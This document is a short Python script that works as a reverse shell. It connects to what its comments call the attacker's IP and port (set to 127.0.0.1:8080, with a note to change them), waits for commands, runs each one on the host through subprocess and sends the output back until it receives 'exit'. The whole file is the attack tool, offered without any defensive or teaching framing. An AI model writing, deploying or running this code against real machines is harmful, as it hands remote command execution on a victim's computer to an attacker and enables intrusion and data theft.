import socket
import subprocess

# create connection with attacker

def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',8080)) # change ip and port of attacker
    
    while True:
        # receive command
        command = s.recv(1024).decode()
        if command == 'exit':
         
            break
        # execute command
        output = subprocess.getoutput(command)
        # send output
        s.send(output.encode())

    s.close()
    
connect()